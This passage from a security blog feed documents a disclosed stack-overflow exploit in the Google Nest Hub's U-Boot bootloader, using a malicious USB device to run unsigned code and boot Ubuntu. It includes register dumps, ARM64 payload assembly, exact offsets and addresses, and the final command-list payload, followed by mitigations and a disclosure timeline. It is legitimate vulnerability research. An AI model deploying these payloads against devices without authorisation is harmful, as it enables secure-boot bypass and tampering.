+&lt;span class="nl"&gt;x24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt; &lt;span class="nl"&gt;x25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;000000007ff&lt;/span&gt;&lt;span class="n"&gt;dcd80&lt;/span&gt;
+&lt;span class="nl"&gt;x26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009ac0&lt;/span&gt; &lt;span class="nl"&gt;x29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8dfffffc8c&lt;/span&gt;
+
+&lt;span class="n"&gt;Resetting&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can notice that the link register &lt;em&gt;lr&lt;/em&gt; contains an invalid pointer : fffffc8ffffffc8e. We recognize values 0xFFFFFC8E and 0xFFFFFC8F from our payload. This means the offset is 0x238 (0x8e * 4 bytes).&lt;/p&gt;
+&lt;h2&gt;3.3 Payload address&lt;/h2&gt;
+&lt;p&gt;We can now redirect code execution to an arbitrary address specified at offset 0x238 in our payload. The next step is to determine the start address of this payload to finally execute it.&lt;/p&gt;
+&lt;p&gt;We create a &lt;a href="https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step2.S"&gt;large payload&lt;/a&gt; (maximum allowed block size is 0x8000) filled with many branch instructions that all lead to few instructions at the very end.&lt;/p&gt;
+&lt;p&gt;If we manage to guess the address of any of these 8,185 branch instructions, the payload will be executed.
+And we have a major hint : we already know that stack top is located below &lt;em&gt;gd&lt;/em&gt; address (register &lt;em&gt;x18&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;One educated guess is : (gd - 0x8000) = (0x7bee1dc8 - 0x8000) = &lt;strong&gt;0x7BED9DC8&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
+&lt;span class="na"&gt;.global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
+    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
+&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x7BED9DC8&lt;/span&gt; &lt;span class="c1"&gt;// payload pointer at offset 0x238&lt;/span&gt;
+&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
+    &lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="no"&gt;_payload&lt;/span&gt;
+&lt;span class="nl"&gt;_payload:&lt;/span&gt;
+    &lt;span class="nf"&gt;adr&lt;/span&gt; &lt;span class="no"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;x30&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xcafe&lt;/span&gt;
+    &lt;span class="nf"&gt;blr&lt;/span&gt; &lt;span class="no"&gt;x13&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The first instruction &lt;em&gt;adr&lt;/em&gt; sets register &lt;em&gt;x19&lt;/em&gt; to the payload's start address.
+The last instruction &lt;em&gt;blr&lt;/em&gt; branches to an invalid pointer &lt;em&gt;x13&lt;/em&gt; to ensure a crash, and thus dump registers on UART.&lt;/p&gt;
+&lt;p&gt;We &lt;a href="https://github.com/frederic/chipicopwn/commit/e118c46355d35d8ef40450fcbee2ca2ccb49ffb2"&gt;modify the Pico code&lt;/a&gt; to use this new payload. The device crashes again :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Synchronous Abort&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;esr&lt;/span&gt; &lt;span class="mh"&gt;0x8a000000&lt;/span&gt;
+&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ffffffff8110e001&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffffffcfeb700&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;reloc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bedd700&lt;/span&gt;
+&lt;span class="nl"&gt;x0&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt; &lt;span class="nl"&gt;x1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
+&lt;span class="nl"&gt;x2&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5888&lt;/span&gt; &lt;span class="nl"&gt;x3&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x4&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt; &lt;span class="nl"&gt;x5&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000200&lt;/span&gt;
+&lt;span class="nl"&gt;x6&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;d63f01a0d2995fd6&lt;/span&gt; &lt;span class="nl"&gt;x7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000000&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
+&lt;span class="nl"&gt;x10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c0021b0&lt;/span&gt; &lt;span class="nl"&gt;x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009b80&lt;/span&gt;
+&lt;span class="nl"&gt;x12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
+&lt;span class="nl"&gt;x14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5c4c&lt;/span&gt; &lt;span class="nl"&gt;x15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt;
+&lt;span class="nl"&gt;x16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000004060&lt;/span&gt; &lt;span class="nl"&gt;x17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;00000000000000&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;
+&lt;span class="nl"&gt;x18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bee1dc8&lt;/span&gt; &lt;span class="nl"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5700&lt;/span&gt;
+&lt;span class="nl"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed9dc8&lt;/span&gt; &lt;span class="nl"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5960&lt;/span&gt;
+&lt;span class="nl"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000&lt;/span&gt;&lt;span class="n"&gt;cafe&lt;/span&gt; &lt;span class="nl"&gt;x23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt;
+&lt;span class="nl"&gt;x24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt; &lt;span class="nl"&gt;x25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;000000007ff&lt;/span&gt;&lt;span class="n"&gt;dcd80&lt;/span&gt;
+&lt;span class="nl"&gt;x26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009ac0&lt;/span&gt; &lt;span class="nl"&gt;x29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;14001f6e14001&lt;/span&gt;&lt;span class="n"&gt;f6f&lt;/span&gt;
+
+&lt;span class="n"&gt;Resetting&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Register &lt;em&gt;x22&lt;/em&gt; contains the flag that indicates the payload was executed successfully. And &lt;em&gt;x19&lt;/em&gt; reveals that payload's start address is &lt;strong&gt;0x7bed5700&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;To summarize, the exploit requires an USB Mass Storage device with :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;block size of 1024, 2048, 4096, 8192, 16384 or 32768 bytes&lt;/li&gt;
+&lt;li&gt;payload contained in block 0&lt;/li&gt;
+&lt;li&gt;value 0x000000007bed5700 set at offset 0x238 in block 0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;3.4 Dumping running bootloader&lt;/h2&gt;
+&lt;p&gt;We can now execute arbitrary code. But developing a baremetal payload that loads an alternative bootloader/OS from an USB flash drive is a bit tricky. Instead, it would be easier to directly call the bootloader code already in memory. But to do so, we must first obtain the bootloader.&lt;/p&gt;
+&lt;p&gt;We create a &lt;a href="https://github.com/frederic/chipicopwn/blob/main/payloads/memdump_over_uart.c"&gt;payload that dumps RAM memory over UART&lt;/a&gt;. The information required to control the UART (registers, addresses) is obtained from U-Boot source code.&lt;/p&gt;
+&lt;p&gt;First, we dump the &lt;a href="https://github.com/u-boot/u-boot/blob/master/include/asm-generic/global_data.h"&gt;&lt;em&gt;gd&lt;/em&gt; structure&lt;/a&gt; (register &lt;em&gt;x18&lt;/em&gt;), because it contains a pointer to the bootloader code in RAM :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Dumped U-Boot gd structure" src="https://fredericb.info/blog/elaine/struct_gd_dump.png" style="display: block;margin-left: auto;margin-right: auto;"&gt;&lt;/p&gt;
+&lt;p&gt;Variable &lt;em&gt;gd-&amp;gt;relocaddr&lt;/em&gt; indicates that the bootloader is at &lt;strong&gt;0x7fef2000&lt;/strong&gt;. We dump memory from this address up to &lt;em&gt;gd-&amp;gt;ram_top&lt;/em&gt;.&lt;/p&gt;
+&lt;h2&gt;3.5 Final payload&lt;/h2&gt;
+&lt;p&gt;With the bootloader image in hands, we can design a payload that relies on bootloader functions. We use &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt; to get the address of function &lt;a href="https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84"&gt;run_command_list&lt;/a&gt;, which gives us access to U-Boot built-in commands.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
+&lt;span class="na"&gt;.global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1000 // move SP below us to avoid being overwritten when calling functions&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_bug_ptr&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_bug_fix&lt;/span&gt;
+    &lt;span class="nf"&gt;str&lt;/span&gt; &lt;span class="no"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;x0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  &lt;span class="c1"&gt;// fix the bug we just exploited&lt;/span&gt;
+    &lt;span class="nf"&gt;adr&lt;/span&gt; &lt;span class="no"&gt;x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_command_list&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;w1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xffffffff&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;w2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x0&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x30&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_download_buf&lt;/span&gt; &lt;span class="c1"&gt;// set LR to download buffer&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt; &lt;span class="no"&gt;x3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;_run_command_list&lt;/span&gt; &lt;span class="c1"&gt;// load binary into download buffer&lt;/span&gt;
+    &lt;span class="nf"&gt;br&lt;/span&gt; &lt;span class="no"&gt;x3&lt;/span&gt;
+
+&lt;span class="nl"&gt;_bug_ptr:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x7ff26060&lt;/span&gt;
+&lt;span class="nl"&gt;_bug_fix:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0xd65f03c0d2800000&lt;/span&gt;
+&lt;span class="nl"&gt;_download_buf:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x01000000&lt;/span&gt;
+&lt;span class="nl"&gt;_run_command_list:&lt;/span&gt; &lt;span class="na"&gt;.dword&lt;/span&gt; &lt;span class="mi"&gt;0x7ff24720&lt;/span&gt;
+&lt;span class="nl"&gt;_command_list:&lt;/span&gt; &lt;span class="na"&gt;.asciz&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;echo CHIPICOPWN!;osd setcolor 0x1b0d2b0d;usb reset;fatload usb 0 0x8000000 CHIPICOPWN.BMP;bmp display 0x8000000;while true;do usb reset;if fatload usb 0 0x01000000 u-boot-elaine.bin;then echo yolo;exit;fi;done;&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This final payload :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;fixes (in RAM) the bug we just exploited&lt;/li&gt;
+&lt;li&gt;calls U-Boot function &lt;a href="https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84"&gt;run_command_list&lt;/a&gt; with &lt;em&gt;_command_list&lt;/em&gt; as argument&lt;/li&gt;
+&lt;li&gt;sets the download buffer (0x01000000) as return address to execute next stage (if any)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The U-Boot commands in &lt;em&gt;_command_list&lt;/em&gt; load 2 files from the first FAT partition of USB Mass Storage device :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;CHIPICOPWN.BMP&lt;/em&gt; : the logo to display&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;u-boot-elaine.bin&lt;/em&gt; : the next payload to run. In our case, a custom U-Boot image.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Once function &lt;em&gt;run_command_list&lt;/em&gt; returns, the next payload is executed.&lt;/p&gt;
+&lt;p&gt;Since Rasperry Pi Pico flash memory is limited, we can put the file &lt;em&gt;u-boot-elaine.bin&lt;/em&gt; on another USB flash drive that is hot-swapped with the Pico.&lt;/p&gt;
+&lt;p&gt;The &lt;a href="https://github.com/frederic/chipicopwn"&gt;source code &amp;amp; prebuilt Pico binary with this final payload are available on GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="CHIPICOPWN booted on Google Nest Hub" src="https://fredericb.info/blog/elaine/chipicopwn-boot.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
+&lt;h1&gt;4. Booting Ubuntu from USB&lt;/h1&gt;
+&lt;p&gt;We can now boot an unsigned OS thanks to the exploitation tool. As a proof-of-concept, we make a bootable USB flash drive based on the &lt;a href="https://cdimage.ubuntu.com/releases/22.04/release/"&gt;preinstalled Ubuntu image for Raspberry Pi Generic (64-bit ARM)&lt;/a&gt;. Since this Ubuntu image is designed for another target, we must change few things to get it to boot :&lt;/p&gt;
+&lt;p&gt;We build a &lt;a href="https://github.com/frederic/elaine-u-boot"&gt;custom U-Boot bootloader&lt;/a&gt; with &lt;a href="https://github.com/frederic/elaine-u-boot/commit/171be963a57cf089d15f6c4f2aa4ffb81d445d1b"&gt;secure boot disabled&lt;/a&gt; and &lt;a href="https://github.com/frederic/elaine-u-boot/commit/7d4ec4f68dc7bdca32511222ff1ed31b30b8f899"&gt;boot flow altered to load environment from USB flash drive&lt;/a&gt;.
+We also build a &lt;a href="https://github.com/frederic/elaine-linux"&gt;custom Linux kernel for elaine&lt;/a&gt; with &lt;a href="https://github.com/frederic/elaine-linux/commit/11068237d9178e77d79e3a5d27fc4f8f9b923c51"&gt;additionnal drivers like USB mouse&lt;/a&gt;.
+The initial ramdisk (initrd) from Ubuntu is &lt;a href="https://github.com/frederic/elaine-bootimg#ramdisk-details"&gt;repacked&lt;/a&gt; to integrate firmware binaries required for the touchscreen. The boot image is &lt;a href="https://github.com/frederic/elaine-bootimg/blob/main/mkbootimg.sh"&gt;created&lt;/a&gt; based on the custom Linux kernel and modified initrd.&lt;/p&gt;
+&lt;p&gt;All these files are copied to the Ubuntu flash drive. &lt;a href="https://github.com/frederic/chipicopwn"&gt;They are available on GitHub, as well as a step-by-step guide.&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Ubuntu booted on Google Nest Hub" src="https://fredericb.info/blog/elaine/elaine-ubuntu.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Hardware exploration led to uncovering an unexpected USB port. Software exploration revealed that it can boot from an USB Mass Storage device. Bug hunting exposed a stack overflow vulnerability in the DOS partition parser.&lt;/p&gt;
+&lt;p&gt;As a result, an attacker can execute arbitrary code at early boot stage (before kernel execution) by plugging a malicious USB device and pressing two buttons.&lt;/p&gt;
+&lt;p&gt;Several changes could have reduced the security risk.&lt;/p&gt;
+&lt;p&gt;At hardware level, the USB port — which is of no use to users — facilitates the attack. While removing external access to the USB interface doesn't fix the issue, it would require the attacker to fully disassemble the device, thereby increasing the time required to perform the attack.&lt;/p&gt;
+&lt;p&gt;At software level, attack surface can be reduced by not relying on partition or filesystem layers in the recovery feature. Instead, U-Boot could have read the recovery image from the raw block device (just like some BL1s read BL2 image).&lt;/p&gt;
+&lt;p&gt;Regarding the vulnerability itself, it shouldn't even exist since it's already been fixed upstream, twice :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/fe8c2806cdba70479e351299881a395dc2be7785"&gt;Bug introduced on 2002-11-02&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/54193c5d8133f4f35267f412e5c1bbcbc6ac041c"&gt;Fixed on 2011-07-27&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/8639e34d2c5e12cc2e45c95b1a2e97c22bf6a711"&gt;Bug reintroduced on 2018-02-07&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/u-boot/u-boot/commit/7aed3d380981565b5bb2810d5d13aad1ff994f1a"&gt;Fixed 2019-09-19&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The lack of CVE may explain why it hasn't been propagated downstream.&lt;/p&gt;
+&lt;p&gt;Finally, mitigations in U-Boot, like stack canary or ASLR, could have made exploitation way harder, especially considering the &lt;em&gt;black-box&lt;/em&gt; approach.&lt;/p&gt;
+&lt;h1&gt;Timeline&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;2021-10-28 : Attack vector doesn't qualify for Pwn2Own 2021&lt;/li&gt;
+&lt;li&gt;2021-11-01 : Vulnerability disclosed to Google&lt;/li&gt;
+&lt;li&gt;2021-12 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; : Security update released by Google&lt;/li&gt;
+&lt;li&gt;2022-06-15 : Public disclosure&lt;/li&gt;
+&lt;/ul&gt;</content><category term="arm"></category><category term="amlogic"></category><category term="bootloader"></category><category term="exploit"></category><category term="nest"></category><category term="secureboot"></category><category term="uboot"></category><category term="ubuntu"></category><category term="usb"></category></entry><entry><title>Booting Ubuntu on Google Chromecast With Google TV</title><link href="https://fredericb.info/2021/11/booting-ubuntu-on-google-chromecast-with-google-tv.html" rel="alternate"></link><published>2021-11-29T00:00:00-08:00</published><updated>2021-11-29T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2021-11-29:/2021/11/booting-ubuntu-on-google-chromecast-with-google-tv.html</id><summary type="html">&lt;p&gt;In a previous post, we detailed &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;a vulnerability in the Amlogic System-On-Chip bootROM&lt;/a&gt; that allows arbitrary code execution at EL3.
 Since the &lt;a href="https://store.google.com/us/product/chromecast_google_tv"&gt;Chromecast with Google TV&lt;/a&gt; (CCwGTV) is one of the devices affected by this issue, it opens the possibility to run a custom OS like Ubuntu.&lt;/p&gt;
 &lt;p&gt;This post describes …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In a previous post, we detailed &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;a vulnerability in the Amlogic System-On-Chip bootROM&lt;/a&gt; that allows arbitrary code execution at EL3.
 Since the &lt;a href="https://store.google.com/us/product/chromecast_google_tv"&gt;Chromecast with Google TV&lt;/a&gt; (CCwGTV) is one of the devices affected by this issue, it opens the possibility to run a custom OS like Ubuntu.&lt;/p&gt;
